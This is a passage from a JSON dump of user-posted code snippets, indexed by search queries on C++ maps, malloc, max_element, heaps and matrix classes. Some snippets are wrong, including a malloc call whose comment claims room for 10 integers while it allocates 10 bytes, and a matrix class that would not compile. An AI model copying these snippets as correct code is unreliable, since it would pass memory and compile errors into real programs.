    "description": "#include <iostream> #include <cstdlib> using namespace std;  int main() { \tint *ptr; \tptr = (int*) malloc(5*sizeof(int));  \tif(!ptr) \t{ \t\tcout << \"Memory Allocation Failed\"; \t\texit(1); \t} \tcout << \"Initializing values...\" << endl << endl;  \tfor (int i=0; i<5; i++) \t{ \t\tptr[i] = i*2+1; \t} \tcout << \"Initialized values\" << endl;  \tfor (int i=0; i<5; i++) \t{ \t\t/* ptr[i] and *(ptr+i) can be used interchangeably */ \t\tcout << *(ptr+i) << endl; \t}  \tfree(ptr); \treturn 0; }\n/* malloc example: random string generator*/ #include <stdio.h>      /* printf, scanf, NULL */ #include <stdlib.h>     /* malloc, free, rand */  int main () {   int i,n;   char * buffer;    printf (\"How long do you want the string? \");   scanf (\"%d\", &i);    buffer = (char*) malloc (i+1);   if (buffer==NULL) exit (1);    for (n=0; n<i; n++)     buffer[n]=rand()&+'a';   buffer[i]='\\0';    printf (\"Random string: %s\\n\",buffer);   free (buffer);    return 0; }\nint alloc_size = 10; int* buffer = (int*) malloc (alloc_size); //Allocate memory block which can fit 10 integers \nvoid* malloc(size_t size);\n",
    "reg_date": "2021-10-12T11:42:02.000Z"
  },
  {
    "id": 3019,
    "keyword": null,
    "link": null,
    "title": " map::begin",
    "description": "a => 200 b => 100 c => 300 \n",
    "reg_date": "2021-10-12T11:42:02.000Z"
  },
  {
    "id": 3020,
    "keyword": null,
    "link": null,
    "title": " map.erase in c++",
    "description": "it=mymap.find('b'); mymap.erase (it);                   // erasing by iterator mymap.erase ('c');                  // erasing by key\n",
    "reg_date": "2021-10-12T11:42:02.000Z"
  },
  {
    "id": 3021,
    "keyword": null,
    "link": null,
    "title": " map arduino",
    "description": "Syntax map(value, fromLow, fromHigh, toLow, toHigh)  Parameters value: the number to map. fromLow: the lower bound of the value&rsquo;s current range. fromHigh: the upper bound of the value&rsquo;s current range. toLow: the lower bound of the value&rsquo;s target range. toHigh: the upper bound of the value&rsquo;s target range.    Example: map(val, 0, 255, 0, 1023);\nlong map(long x, long in_min, long in_max, long out_min, long out_max)  {   return (x - in_min) * (out_max - out_min) / (in_max - in_min) + out_min; }\n",
    "reg_date": "2021-10-12T11:42:02.000Z"
  },
  {
    "id": 3022,
    "keyword": null,
    "link": null,
    "title": " map at function c++",
    "description": "// map::at #include <iostream> #include <string> #include <map>  int main () {   std::map<std::string,int> mymap = {                 { \"alpha\", 0 },                 { \"beta\", 0 },                 { \"gamma\", 0 } };    mymap.at(\"alpha\") = 10;   mymap.at(\"beta\") = 20;   mymap.at(\"gamma\") = 30;    for (auto& x: mymap) {     std::cout << x.first << \": \" << x.second << '\\n';   }    return 0; }\n",
    "reg_date": "2021-10-12T11:42:02.000Z"
  },
  {
    "id": 3023,
    "keyword": null,
    "link": null,
    "title": " map c++",
    "description": "//Since c++17 for (auto& [key, value]: myMap) {     cout << key << \" has value \" << value << endl; } //Since c++11 for (auto& kv : myMap) {     cout << kv.first << \" has value \" << kv.second << endl; }\n#include <iostream> #include <string> #include <map>  using std::string; using std::map;  int main() { \t// A new map   \tmap<string, int> myMap = { // This equals sign is optional \t\t{\"one\", 1},     \t{\"two\", 2},     \t{\"three\", 3}   \t};    \t// Print map contents with a range-based for loop     // (works in C++11 or higher)   \tfor (auto& iter: myMap) {     \tstd::cout << iter.first << \": \" << iter.second << std::endl;     \t} }\n#include<bits/stdc++.h> using namespace std;  int main() {   map<string,int>mapa;   for(int i=0;i<10;i++){     int x;     string s;     cin>>x>>s;     mapa.insert({s,x});     }   for(auto [x,y]:mapa){     cout<<x<<\" \"<<y<<'\\n';   } }\n//assuming your variables are called : variables_ #include <map> #include <string>  std::map<int, std::string> map_; map_[1] = \"mercury\"; map_[2] = \"mars\"; map_.insert(std::make_pair(3, \"earth\")); //either synthax works to declare a new entry  return map_[2]; //here, map_[2] will return \"mars\"\n#include <map>  // empty map container  map<int, int> gquiz1;     // insert elements in random order  gquiz1.insert(pair<int, int>(1, 40)); \n#include <bits/stdc++.h> #include <iostream> #include <map> using namespace std; void mapDemo(){ \tmap<int, int> A; \tA[1] = 100; \tA[2] = -1; \tA[3] = 200; \tA[100000232] = 1; \t//to find the value of a key \t//A.find(key) \t \t//to delete the key \t//A.erase(key) \t \tmap<char, int> cnt; \tstring x = \"Sumant Tirkey\"; \t \tfor(char c:x){ \t\tcnt[c]++;//map the individual character with it's occurance_Xtimes \t} \t \t//see  how many times a and z occures in my name \tcout<< cnt['a']<<\" \"<<cnt['z']<<endl; \t }  \t int main() { \tmapDemo(); \treturn 0; }\n",
    "reg_date": "2021-10-12T11:42:03.000Z"
  },
  {
    "id": 3024,
    "keyword": null,
    "link": null,
    "title": " map count function c++",
    "description": "map_name.count(key k) /*    Parameters: k which specifies the key to be searched in the map container.    Return Value: returns the number of times the key K is present in the map container.     \t\t  \"RETURNS 0\"- if the key is not present in the map container. */\nint n; cin>>n; long val; map<int,long> mp3; long long res=0; while(n--){ \tcin>>val; \tif(mp3.count(val)) \tres+=mp3[val];      //mp3.count(val) returns 1 if val is present in the map already or      //the number of times the key K is present in the map container.     if(mp2.count(val)) \tmp3[val*r]+=mp2[val]; \tmp2[val*r]++; } cout<<res<<endl;\n",
    "reg_date": "2021-10-12T11:42:03.000Z"
  },
  {
    "id": 3025,
    "keyword": null,
    "link": null,
    "title": " map data access by key in cpp",
    "description": "// accessing mapped values #include <iostream> #include <map> #include <string>  int main () {   std::map<char,std::string> mymap;    mymap['a']=\"an element\";   mymap['b']=\"another element\";   mymap['c']=mymap['b'];    std::cout << \"mymap['a'] is \" << mymap['a'] << '\\n';   std::cout << \"mymap['b'] is \" << mymap['b'] << '\\n';   std::cout << \"mymap['c'] is \" << mymap['c'] << '\\n';   std::cout << \"mymap['d'] is \" << mymap['d'] << '\\n';    std::cout << \"mymap now contains \" << mymap.size() << \" elements.\\n\";    return 0; }\n",
    "reg_date": "2021-10-12T11:42:03.000Z"
  },
  {
    "id": 3026,
    "keyword": null,
    "link": null,
    "title": " map declaration c++",
    "description": "//assuming your variables are called : variables_ #include <map> #include <string>  std::map<int, std::string> map_; map_[1] = \"mercury\"; map_[2] = \"mars\"; map_.insert(std::make_pair(3, \"earth\")); //either synthax works to declare a new entry  return map_[2]; //here, map_[2] will return \"mars\"\n",
    "reg_date": "2021-10-12T11:42:03.000Z"
  },
  {
    "id": 3027,
    "keyword": null,
    "link": null,
    "title": " map in c++",
    "description": "//Since c++17 for (auto& [key, value]: myMap) {     cout << key << \" has value \" << value << endl; } //Since c++11 for (auto& kv : myMap) {     cout << kv.first << \" has value \" << kv.second << endl; }\n#include <iostream> #include <string> #include <map>  using std::string; using std::map;  int main() { \t// A new map   \tmap<string, int> myMap = { // This equals sign is optional \t\t{\"one\", 1},     \t{\"two\", 2},     \t{\"three\", 3}   \t};    \t// Print map contents with a range-based for loop     // (works in C++11 or higher)   \tfor (auto& iter: myMap) {     \tstd::cout << iter.first << \": \" << iter.second << std::endl;     \t} }\n#include<bits/stdc++.h> using namespace std;  int main() {   map<string,int>mapa;   for(int i=0;i<10;i++){     int x;     string s;     cin>>x>>s;     mapa.insert({s,x});     }   for(auto [x,y]:mapa){     cout<<x<<\" \"<<y<<'\\n';   } }\n//assuming your variables are called : variables_ #include <map> #include <string>  std::map<int, std::string> map_; map_[1] = \"mercury\"; map_[2] = \"mars\"; map_.insert(std::make_pair(3, \"earth\")); //either synthax works to declare a new entry  return map_[2]; //here, map_[2] will return \"mars\"\n// map::at #include <iostream> #include <string> #include <map>  int main () {   std::map<std::string,int> mymap = {                 { \"alpha\", 0 },                 { \"beta\", 0 },                 { \"gamma\", 0 } };    mymap.at(\"alpha\") = 10;   mymap.at(\"beta\") = 20;   mymap.at(\"gamma\") = 30;    for (auto& x: mymap) {     std::cout << x.first << \": \" << x.second << '\\n';   }    return 0; }\n#include <bits/stdc++.h> #include <iostream> #include <map> using namespace std; void mapDemo(){ \tmap<int, int> A; \tA[1] = 100; \tA[2] = -1; \tA[3] = 200; \tA[100000232] = 1; \t//to find the value of a key \t//A.find(key) \t \t//to delete the key \t//A.erase(key) \t \tmap<char, int> cnt; \tstring x = \"Sumant Tirkey\"; \t \tfor(char c:x){ \t\tcnt[c]++;//map the individual character with it's occurance_Xtimes \t} \t \t//see  how many times a and z occures in my name \tcout<< cnt['a']<<\" \"<<cnt['z']<<endl; \t }  \t int main() { \tmapDemo(); \treturn 0; }\n",
    "reg_date": "2021-10-12T11:42:03.000Z"
  },
  {
    "id": 3028,
    "keyword": null,
    "link": null,
    "title": " map in c++ find whether key exists",
    "description": "if ( m.find(\"f\") == m.end() ) {   // not found } else {   // found }\n",
    "reg_date": "2021-10-12T11:42:03.000Z"
  },
  {
    "id": 3029,
    "keyword": null,
    "link": null,
    "title": " map in c",
    "description": "#include <map>  std::map<size_t, std::string> map;  map[10] = \"Hello\"; map[1] = \"boys\"; map[901] = \"girls\"\n",
    "reg_date": "2021-10-12T11:42:03.000Z"
  },
  {
    "id": 3030,
    "keyword": null,
    "link": null,
    "title": " map in cpp",
    "description": "//Since c++17 for (auto& [key, value]: myMap) {     cout << key << \" has value \" << value << endl; } //Since c++11 for (auto& kv : myMap) {     cout << kv.first << \" has value \" << kv.second << endl; }\n#include <iostream> #include <string> #include <map>  using std::string; using std::map;  int main() { \t// A new map   \tmap<string, int> myMap = { // This equals sign is optional \t\t{\"one\", 1},     \t{\"two\", 2},     \t{\"three\", 3}   \t};    \t// Print map contents with a range-based for loop     // (works in C++11 or higher)   \tfor (auto& iter: myMap) {     \tstd::cout << iter.first << \": \" << iter.second << std::endl;     \t} }\n#include<bits/stdc++.h> using namespace std;  int main() {   map<string,int>mapa;   for(int i=0;i<10;i++){     int x;     string s;     cin>>x>>s;     mapa.insert({s,x});     }   for(auto [x,y]:mapa){     cout<<x<<\" \"<<y<<'\\n';   } }\n#include <map>  // empty map container  map<int, int> gquiz1;     // insert elements in random order  gquiz1.insert(pair<int, int>(1, 40)); \n#include <bits/stdc++.h> #include <iostream> #include <map> using namespace std; void mapDemo(){ \tmap<int, int> A; \tA[1] = 100; \tA[2] = -1; \tA[3] = 200; \tA[100000232] = 1; \t//to find the value of a key \t//A.find(key) \t \t//to delete the key \t//A.erase(key) \t \tmap<char, int> cnt; \tstring x = \"Sumant Tirkey\"; \t \tfor(char c:x){ \t\tcnt[c]++;//map the individual character with it's occurance_Xtimes \t} \t \t//see  how many times a and z occures in my name \tcout<< cnt['a']<<\" \"<<cnt['z']<<endl; \t }  \t int main() { \tmapDemo(); \treturn 0; }\n#include <map>  int main(){   //new map   std::map <int,int> myMap;   myMap[0] = 1;   myMap[1] = 2;   myMap[2] = 3;   myMap[3] = 4; }\n",
    "reg_date": "2021-10-12T11:42:03.000Z"
  },
  {
    "id": 3031,
    "keyword": null,
    "link": null,
    "title": " map key exists c++",
    "description": "if ( m.find(\"f\") == m.end() ) {   // not found } else {   // found }\nif ( m.find(\"f\") == m.end() ) {   // not found } else {   // found } \nif ( !(myMap.find(\"key\") == myMap.end()) ) {\t// \"key\" exists\t    } else {\t// not found\t    } \n",
    "reg_date": "2021-10-12T11:42:04.000Z"
  },
  {
    "id": 3032,
    "keyword": null,
    "link": null,
    "title": " map of int and vector syntax",
    "description": "map <int, vector<int>> m\n",
    "reg_date": "2021-10-12T11:42:04.000Z"
  },
  {
    "id": 3033,
    "keyword": null,
    "link": null,
    "title": " map of maps c++",
    "description": "#include <bits/stdc++.h> #include <iostream> #include <map> using namespace std; void mapDemo(){ \tmap<int, int> A; \tA[1] = 100; \tA[2] = -1; \tA[3] = 200; \tA[100000232] = 1; \t//to find the value of a key \t//A.find(key) \t \t//to delete the key \t//A.erase(key) \t \tmap<char, int> cnt; \tstring x = \"Sumant Tirkey\"; \t \tfor(char c:x){ \t\tcnt[c]++;//map the individual character with it's occurance_Xtimes \t} \t \t//see  how many times a and z occures in my name \tcout<< cnt['a']<<\" \"<<cnt['z']<<endl; \t }  \t int main() { \tmapDemo(); \treturn 0; }\nmap <typename,map<typename,typename>> mp; map[key1][key2]=values\n",
    "reg_date": "2021-10-12T11:42:04.000Z"
  },
  {
    "id": 3034,
    "keyword": null,
    "link": null,
    "title": " map size",
    "description": "Input : map1 = {                  {1, \"India\"},                 {2, \"Nepal\"},                 {3, \"Sri Lanka\"},                 {4, \"Myanmar\"}                }         map1.size(); Output: 4  Input : map2 = {};         map2.size(); Output: 0\nmap_name.size()\n",
    "reg_date": "2021-10-12T11:42:04.000Z"
  },
  {
    "id": 3035,
    "keyword": null,
    "link": null,
    "title": " map update field elixir",
    "description": "map = %{map | is_active: true} \n",
    "reg_date": "2021-10-12T11:42:04.000Z"
  },
  {
    "id": 3036,
    "keyword": null,
    "link": null,
    "title": " map vs unordered map in C++",
    "description": "                  | map             | unordered_map --------------------------------------------------------- Ordering        | increasing  order   | no ordering                 | (by default)        |  Implementation  | Self balancing BST  | Hash Table                 | like Red-Black Tree |    search time     | log(n)              | O(1) -> Average                  |                     | O(n) -> Worst Case  Insertion time  | log(n) + Rebalance  | Same as search                        Deletion time   | log(n) + Rebalance  | Same as search   ::-> Use std::map when 1. You need ordered data. 2. You would have to print/access the data (in sorted order). 3. You need predecessor/successor of elements.    ::-> Use std::unordered_map when 1. You need to keep count of some data (Example &ndash; strings) and no ordering is required. 2. You need single element access i.e. no traversal.\n",
    "reg_date": "2021-10-12T11:42:04.000Z"
  },
  {
    "id": 3037,
    "keyword": null,
    "link": null,
    "title": " maps stl",
    "description": "#include <bits/stdc++.h> #include <iostream> #include <map> using namespace std; void mapDemo(){ \tmap<int, int> A; \tA[1] = 100; \tA[2] = -1; \tA[3] = 200; \tA[100000232] = 1; \t//to find the value of a key \t//A.find(key) \t \t//to delete the key \t//A.erase(key) \t \tmap<char, int> cnt; \tstring x = \"Sumant Tirkey\"; \t \tfor(char c:x){ \t\tcnt[c]++;//map the individual character with it's occurance_Xtimes \t} \t \t//see  how many times a and z occures in my name \tcout<< cnt['a']<<\" \"<<cnt['z']<<endl; \t }  \t int main() { \tmapDemo(); \treturn 0; }\n#include<iostream> #include<map> #include<algorithm>  using namespace std;  int main() {     map<int,int>map1{{1,2},{2,3},{3,5},{4,7},{5,11}};     cout<<map1.at(3)<<endl;     cout<<map1[3]<<endl;     map1[6];     for(map<int,int>::iterator it=map1.begin();it!=map1.end();it++)     {         cout<<it->first<<\" \"<<it->second<<endl;     }     cout<<endl;     cout<<\"----------------------\"<<endl;     map1.insert(pair<int,int>(7,17));     map1.insert(make_pair(8,23));      for(map<int,int>::iterator it=map1.begin();it!=map1.end();it++)     {         cout<<it->first<<\" \"<<it->second<<endl;     }     cout<<endl;     map<int,int>::iterator its=map1.find(2);     map1.erase(its);     for(map<int,int>::iterator it=map1.begin();it!=map1.end();it++)     {         cout<<it->first<<\" \"<<it->second<<endl;     }     cout<<endl;     auto itss=map1.begin();     auto itss2=map1.end();     map1.erase(itss,itss2);     for(map<int,int>::iterator it=map1.begin();it!=map1.end();it++)     {         cout<<it->first<<\" \"<<it->second<<endl;     }     cout<<endl;      return 0; } \n",
    "reg_date": "2021-10-12T11:42:04.000Z"
  },
  {
    "id": 3038,
    "keyword": null,
    "link": null,
    "title": " marksheet make in the c++",
    "description": "#include<iostream> using namespace std; int main() {   cout<<\"Hello World\";   return 0; }\n",
    "reg_date": "2021-10-12T11:42:04.000Z"
  },
  {
    "id": 3039,
    "keyword": null,
    "link": null,
    "title": " master header file c++",
    "description": "//MASTER HEADER FILE C++ #include<bits/stdc++.h>  //it includes all header file like iostream, cmath, algorithm etc...\n",
    "reg_date": "2021-10-12T11:42:04.000Z"
  },
  {
    "id": 3040,
    "keyword": null,
    "link": null,
    "title": " math expressions",
    "description": "#include<iostream> #include<cmath> #include<iomanip>  unsigned long long factorial(unsigned long long );  unsigned long long factorial(unsigned long long num){      if(num<=0)         return 1;      return num * factorial(num-1); }  int main() {     std::cout<<\"Enter number\\t\"<<std::endl;     unsigned long long num,number;     std::cin >> num;     std::cout<<std::fixed<<std::setprecision(9)<<factorial(num)/pow(num,num)<<std::endl;      }   \n",
    "reg_date": "2021-10-12T11:42:04.000Z"
  },
  {
    "id": 3041,
    "keyword": null,
    "link": null,
    "title": " mathf.inverselerp",
    "description": "Calculates the linear parameter t that produces the interpolant value within the range [a, b].  The a and b values define the start and end of the line. Value is a location between a and b. Subtract a from both a and b and value to make a', b' and value'. This makes a' to be zero and b' and value' to be reduced. Finally divide value' by b'. This gives the InverseLerp amount.  using UnityEngine; using System.Collections;  public class ExampleClass : MonoBehaviour {     public float walkSpeed = 5.0f;     public float runSpeed = 10.0f;     public float speed = 8.0f;      void Start()     {         float parameter = Mathf.InverseLerp(walkSpeed, runSpeed, speed);         Debug.Log(\"InverseLerp: 5, 10, 8 = \" + parameter);     } }\n",
    "reg_date": "2021-10-12T11:42:04.000Z"
  },
  {
    "id": 3042,
    "keyword": null,
    "link": null,
    "title": " matplotlib hide numbers on axis",
    "description": "plt.gca().axes.get_yaxis().set_visible(False) \n",
    "reg_date": "2021-10-12T11:42:05.000Z"
  },
  {
    "id": 3043,
    "keyword": null,
    "link": null,
    "title": " matrix 4x4 look at c++",
    "description": "matrix<4x4>::lookat \n",
    "reg_date": "2021-10-12T11:42:05.000Z"
  },
  {
    "id": 3044,
    "keyword": null,
    "link": null,
    "title": " matrix class in c++",
    "description": " template<class T> class matrix{     size_t ROW,COL;     vector<vector<T>> mat; public:     matrix(size_t N, size_t M, int populate = 0){         this->ROW = N;         this->COL = M;         this->mat = vector<vector<T>> (ROW,vector<T> (COL,populate));     }     matrix(size_t N, int populate = 0){         this->ROW = N;         this->COL = N;         this->mat = vector<vector<T>> (ROW,vector<T> (COL,populate));     }     void __init(){         for(int i = 0; i < ROW; ++i){             for(int j = 0; j < COL; ++j){                 cin  >> this->mat[i][j];             }         }     }     void __display(){         for(int i = 0; i < ROW; ++i){             for(int j = 0; j < COL; ++j){                 cout << this->mat[i][j] << \" \";             }             cout << \"\\n\";         }     }     matrix<T> operator*(const matrix &rhs)const{         if(this->COL != rhs.ROW){             throw \"MATRIX MULTIPLICATION CANNOT HAPPEN WITH THE GIVEN MATRICES\"         }         matrix<T> result(this->ROW,rhs.COL);         for(int _i = 0; _i < this->ROW; _i++){             for(int _j = 0; _j < rhs.COL; _j++){                 result[_i][_j] = 0;                 for(int _k = 0; _k < this->COL; ++_k){                     result[_i][_j]+=(this->mat[_i][_k]*rhs.mat[_k][_j]);                 }             }         }         return result;     }     matrix<T> power(int n){         if(n == 0)return matrix<T>(this->ROW, this->COL,1);         if(n == 1)return *this;         matrix p = power(n/2);         p = p*p;         if(n%2)p = p*(*this);         return p;     } };\n",
    "reg_date": "2021-10-12T11:42:05.000Z"
  },
  {
    "id": 3045,
    "keyword": null,
    "link": null,
    "title": " matrix eigen c++ example",
    "description": "#include <iostream> #include <Eigen/Dense>   using namespace Eigen;   int main() {   MatrixXd m(2,2);   m(0,0) = 3;   m(1,0) = 2.5;   m(0,1) = -1;   m(1,1) = m(1,0) + m(0,1);   std::cout << \"Here is the matrix m:\\n\" << m << std::endl;   VectorXd v(2);   v(0) = 4;   v(1) = v(0) - 1;   std::cout << \"Here is the vector v:\\n\" << v << std::endl; }\n",
    "reg_date": "2021-10-12T11:42:05.000Z"
  },
  {
    "id": 3046,
    "keyword": null,
    "link": null,
    "title": " matrix in vector c++",
    "description": "vector<vector <int> > matrix;  cout << \"Row's Length: \" << matrix.size(); cout<< \"Column's Length: \"<< matrix[0].size();\nstd::vector<vector<int>> d; //std::vector<int> d; cout<<\"Enter the N number of ship and port:\"<<endl; cin>>in; cout<<\"\\Enter preference etc..:\\n\"; for(i=0; i<in; i++){  cout<<\"ship\"<<i+1<<\":\"<<' ';     for(j=0; j<in; j++){     cin>>temp;     d.push_back(temp);// I don't know how to push_back here!!     } }\n",
    "reg_date": "2021-10-12T11:42:05.000Z"
  },
  {
    "id": 3047,
    "keyword": null,
    "link": null,
    "title": " matrix multiplication c++ eigen",
    "description": "MatrixXcf a = MatrixXcf::Random(2,2); cout << \"Here is the matrix a\\n\" << a << endl;   cout << \"Here is the matrix a^T\\n\" << a.transpose() << endl;\n  Matrix2d mat;   mat << 1, 2,          3, 4;   std::cout << \"Here is mat*mat:\\n\" << mat*mat << std::endl;\n",
    "reg_date": "2021-10-12T11:42:05.000Z"
  },
  {
    "id": 3048,
    "keyword": null,
    "link": null,
    "title": " matrix multipliction in c++",
    "description": "#include <iostream> using namespace std;  int main() {     int a[10][10], b[10][10], mult[10][10], r1, c1, r2, c2, i, j, k;      cout << \"Enter rows and columns for first matrix: \";     cin >> r1 >> c1;     cout << \"Enter rows and columns for second matrix: \";     cin >> r2 >> c2;      // If column of first matrix in not equal to row of second matrix,     // ask the user to enter the size of matrix again.     while (c1!=r2)     {         cout << \"Error! column of first matrix not equal to row of second.\";          cout << \"Enter rows and columns for first matrix: \";         cin >> r1 >> c1;          cout << \"Enter rows and columns for second matrix: \";         cin >> r2 >> c2;     }      // Storing elements of first matrix.     cout << endl << \"Enter elements of matrix 1:\" << endl;     for(i = 0; i < r1; ++i)         for(j = 0; j < c1; ++j)         {             cout << \"Enter element a\" << i + 1 << j + 1 << \" : \";             cin >> a[i][j];         }      // Storing elements of second matrix.     cout << endl << \"Enter elements of matrix 2:\" << endl;     for(i = 0; i < r2; ++i)         for(j = 0; j < c2; ++j)         {             cout << \"Enter element b\" << i + 1 << j + 1 << \" : \";             cin >> b[i][j];         }      // Initializing elements of matrix mult to 0.     for(i = 0; i < r1; ++i)         for(j = 0; j < c2; ++j)         {             mult[i][j]=0;         }      // Multiplying matrix a and b and storing in array mult.     for(i = 0; i < r1; ++i)         for(j = 0; j < c2; ++j)             for(k = 0; k < c1; ++k)             {                 mult[i][j] += a[i][k] * b[k][j];             }      // Displaying the multiplication of two matrix.     cout << endl << \"Output Matrix: \" << endl;     for(i = 0; i < r1; ++i)     for(j = 0; j < c2; ++j)     {         cout << \" \" << mult[i][j];         if(j == c2-1)             cout << endl;     }      return 0; } \n// Displaying the multiplication of two matrix.     cout << endl << \"Output Matrix: \" << endl;     for(i = 0; i < r1; ++i)     for(j = 0; j < c2; ++j)     {         cout << \" \" << mult[i][j];         if(j == c2-1)             cout << endl;     } \n",
    "reg_date": "2021-10-12T11:42:05.000Z"
  },
  {
    "id": 3049,
    "keyword": null,
    "link": null,
    "title": " matrix transpose tiling",
    "description": "   const int N_r = 56;   const int N_c = 75;    const int TILE_DIM = 16;    const int outer_Dimc = (N_c - 1) / TILE_DIM + 1;   const int outer_Dimr = (N_r - 1) / TILE_DIM + 1;    int** dest;    int** src;  //   // (0) Outer loops to iterate over tiles   //   for (int by = 0; by < outer_Dimr; ++by) {     for (int bx = 0; bx < outer_Dimc; ++bx) {       //       // (1) Loops to iterate over tile entries       //       for (int ty = 0; ty < TILE_DIM; ++ty) {         for (int tx = 0; tx < TILE_DIM; ++tx) {            int col = bx * TILE_DIM + tx;  // Matrix column index           int row = by * TILE_DIM + ty;  // Matrix row index            // Bounds check           if (row < N_r && col < N_c) {             dest[col][row] = src[row][col];           }                    }       }            }   }\n",
    "reg_date": "2021-10-12T11:42:05.000Z"
  },
  {
    "id": 3050,
    "keyword": null,
    "link": null,
    "title": " max array c++",
    "description": "cout << \" max element is: \" << *max_element(array , array + n) << endl;\n*max_element (first_index, last_index); ex:- for an array arr of size n *max_element(arr, arr + n);\nauto Max1 = *max_element(ForwardIt first, ForwardIt last); auto Max2 = *max_element(ForwardIt first, ForwardIt last, Compare comp);  //Example: #include <bits/stdc++.h> using namespace std; main() {     vector<int> v{ 3, 1, -14, 1, 5, 9 };      int result;          result = *max_element(v.begin(), v.end());     cout << \"max element is: \" << result << '\\n'; // 9       result = *max_element(v.begin(), v.end(), [](int a, int b) { return abs(a)<abs(b); });     cout << \"max element (absolute) is: \" << result << '\\n'; //-14 }\n",
    "reg_date": "2021-10-12T11:42:05.000Z"
  },
  {
    "id": 3051,
    "keyword": null,
    "link": null,
    "title": " max c++",
    "description": "priority_queue <int> maxHeap; \ncout << \" max element is: \" << *max_element(array , array + n) << endl;\n// max example #include <iostream>     // std::cout #include <algorithm>    // std::max  int main () {   std::cout << \"max(1,2)==\" << std::max(1,2) << '\\n';   std::cout << \"max(2,1)==\" << std::max(2,1) << '\\n';   std::cout << \"max('a','z')==\" << std::max('a','z') << '\\n';   std::cout << \"max(3.14,2.73)==\" << std::max(3.14,2.73) << '\\n';   return 0; }\n2147483647   unsigned long long int = 18 446 744 073 709 551 615\n",
    "reg_date": "2021-10-12T11:42:05.000Z"
  },
  {
    "id": 3052,
    "keyword": null,
    "link": null,
    "title": " max element c++",
    "description": "*max_element (first_index, last_index); ex:- for an array arr of size n *max_element(arr, arr + n);\nint main()  {      // Get the vector      vector<int> a = { 1, 45, 54, 71, 76, 12 };         // Print the vector      cout << \"Vector: \";      for (int i = 0; i < a.size(); i++)          cout << a[i] << \" \";      cout << endl;         // Find the max element      cout << \"\\nMax Element = \"          << *max_element(a.begin(), a.end());      return 0;  } \nint arr[] = {1,4,2,10}; int n = 4; //size of array cout<<*max_element(arr,arr+n);  // Output: 10\n",
    "reg_date": "2021-10-12T11:42:06.000Z"
  },
  {
    "id": 3053,
    "keyword": null,
    "link": null,
    "title": " max element in array c++ stl",
    "description": "cout << \" max element is: \" << *max_element(array , array + n) << endl;\n*max_element (first_index, last_index); ex:- for an array arr of size n *max_element(arr, arr + n);\nauto Max1 = *max_element(ForwardIt first, ForwardIt last); auto Max2 = *max_element(ForwardIt first, ForwardIt last, Compare comp);  //Example: #include <bits/stdc++.h> using namespace std; main() {     vector<int> v{ 3, 1, -14, 1, 5, 9 };      int result;          result = *max_element(v.begin(), v.end());     cout << \"max element is: \" << result << '\\n'; // 9       result = *max_element(v.begin(), v.end(), [](int a, int b) { return abs(a)<abs(b); });     cout << \"max element (absolute) is: \" << result << '\\n'; //-14 }\nint main(int argc, char** argv) {   int A[4] = {0, 2, 3, 1};   const int N = sizeof(A) / sizeof(int);    cout << \"Index of max element: \"        << distance(A, max_element(A, A + N))        << endl;    return 0; } \n",
    "reg_date": "2021-10-12T11:42:06.000Z"
  },
  {
    "id": 3054,
    "keyword": null,
    "link": null,
    "title": " max element in vector c++",
    "description": "*max_element(a.begin(), a.end()); \nauto max = *max_element(vector.begin(), vector.end());\ncout<<*max_element(a.begin(), a.end())<<endl;\n*max_element (first_index, last_index); ex:- for an array arr of size n *max_element(arr, arr + n);\nint main()  {      // Get the vector      vector<int> a = { 1, 45, 54, 71, 76, 12 };         // Print the vector      cout << \"Vector: \";      for (int i = 0; i < a.size(); i++)          cout << a[i] << \" \";      cout << endl;         // Find the max element      cout << \"\\nMax Element = \"          << *max_element(a.begin(), a.end());      return 0;  } \nauto it = max_element(std::begin(cloud), std::end(cloud)); // c++11\n",
    "reg_date": "2021-10-12T11:42:06.000Z"
  },
  {
    "id": 3055,
    "keyword": null,
    "link": null,
    "title": " max heap c++",
    "description": "priority_queue <int, vector<int>, greater<int>> minHeap;\npriority_queue <int> maxHeap; \n// C++ program to show that priority_queue is by  // default a Max Heap  #include <bits/stdc++.h>  using namespace std;   // Driver code  int main ()  {  \t// Creates a max heap  \tpriority_queue <int> pq;  \tpq.push(5);  \tpq.push(1);  \tpq.push(10);  \tpq.push(30);  \tpq.push(20);   \t// One by one extract items from max heap  \twhile (pq.empty() == false)  \t{  \t\tcout << pq.top() << \" \";  \t\tpq.pop();  \t}   \treturn 0;  }  \npriority_queue <int, vector<int>, greater<int> > pq;\n#include <iostream> using namespace std; void max_heap(int *a, int m, int n) {    int j, t;    t = a[m];    j = 2 * m;    while (j <= n) {       if (j < n && a[j+1] > a[j])          j = j + 1;       if (t > a[j])          break;       else if (t <= a[j]) {          a[j / 2] = a[j];          j = 2 * j;       }    }    a[j/2] = t;    return; } void build_maxheap(int *a,int n) {    int k;    for(k = n/2; k >= 1; k--) {       max_heap(a,k,n);    } } int main() {    int n, i;    cout<<\"enter no of elements of array\\n\";    cin>>n;    int a[30];    for (i = 1; i <= n; i++) {       cout<<\"enter elements\"<<\" \"<<(i)<<endl;       cin>>a[i];    }    build_maxheap(a,n);    cout<<\"Max Heap\\n\";    for (i = 1; i <= n; i++) {       cout<<a[i]<<endl;    } }\n",
    "reg_date": "2021-10-12T11:42:06.000Z"
  },
  {
    "id": 3056,
    "keyword": null,
    "link": null,
    "title": " max heap c++ stl;",
    "description": "// C++ program to show that priority_queue is by  // default a Max Heap  #include <bits/stdc++.h>  using namespace std;   // Driver code  int main ()  {  \t// Creates a max heap  \tpriority_queue <int> pq;  \tpq.push(5);  \tpq.push(1);  \tpq.push(10);  \tpq.push(30);  \tpq.push(20);   \t// One by one extract items from max heap  \twhile (pq.empty() == false)  \t{  \t\tcout << pq.top() << \" \";  \t\tpq.pop();  \t}   \treturn 0;  }  \n",
    "reg_date": "2021-10-12T11:42:06.000Z"
  },
  {
    "id": 3057,
    "keyword": null,
    "link": null,
    "title": " max heap in c++",
